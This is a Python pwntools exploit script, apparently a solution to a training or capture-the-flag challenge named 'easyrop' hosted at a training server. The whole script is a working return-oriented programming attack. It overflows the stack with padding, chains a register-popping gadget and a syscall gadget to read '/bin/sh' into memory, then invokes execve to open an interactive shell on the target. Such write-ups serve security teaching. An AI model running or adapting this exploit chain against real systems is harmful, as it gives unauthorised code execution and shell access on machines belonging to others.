from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./easyrop")
		gdb.attach(p, """
		b *main+10
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./easyrop"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 2015)
else:
	p = process("./easyrop")


def send_zeros():
	time.sleep(0.1)
	p.send(b'\x00\x00\x00\x00')
	time.sleep(0.1)
	p.send(b'\x00\x00\x00\x00')

pop = p64(0x00000000004001c2) # pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
syscall = p64(0x00000000004001b3) # syscall
len_addr = p64(0x0000000000600370)

for i in range(28):
	time.sleep(0.1)
	p.send(b'\x90\x90\x90\x90')
	time.sleep(0.1)

## Return address is the pop chain
time.sleep(0.1)
p.send(b'\xc2\x01\x40\x00')
time.sleep(0.1)
p.send(b'\x00\x00\x00\x00')

send_zeros()

# FIRST PART OF THE CHAIN: Write /bin/sh into len with a read syscall

## RDI = 0 (stdin)
send_zeros()
send_zeros()

## RSI = len
time.sleep(0.1)
p.send(b'\x70\x03\x60\x00')
time.sleep(0.1)
p.send(b'\x00\x00\x00\x00')

send_zeros()

## RDX = 8 (/bin/sh/x00)
time.sleep(0.1)
p.send(b'\x08\x00\x00\x00')
time.sleep(0.1)
p.send(b'\x00\x00\x00\x00')

send_zeros()

## RAX = 0 (read syscall)
send_zeros()
send_zeros()

## Return address is the syscall (for the read)
time.sleep(0.1)
p.send(b'\xb3\x01\x40\x00')
time.sleep(0.1)
p.send(b'\x00\x00\x00\x00')

send_zeros()

## dummy_ret

send_zeros()
send_zeros()

## Return address for the pop chain
time.sleep(0.1)
p.send(b'\xc2\x01\x40\x00')
time.sleep(0.1)
p.send(b'\x00\x00\x00\x00')

send_zeros()

# SECOND PART OF THE CHAIN: Pop the arguments for the execve syscall and ret to syscall

## pop rdi; flag*
time.sleep(0.1)
p.send(b'\x70\x03\x60\x00')
time.sleep(0.1)
p.send(b'\x00\x00\x00\x00')

send_zeros()

## pop rsi; argv = 0
send_zeros()
send_zeros()

## pop rdx; envp = 0
send_zeros()
send_zeros()

## pop rax; rax = 0x3b

time.sleep(0.1)
p.send(b'\x3b\x00\x00\x00')
time.sleep(0.1)
p.send(b'\x00\x00\x00\x00')

send_zeros()

## return address = syscall

time.sleep(0.1)
p.send(b'\xb3\x01\x40\x00')
time.sleep(0.1)
p.send(b'\x00\x00\x00\x00')

send_zeros()

input('end')
p.send(b'\x00')
time.sleep(0.1)
p.send(b'\x00')

## /bin/sh
time.sleep(0.1)
p.sendline(b'/bin/sh\x00')

p.interactive()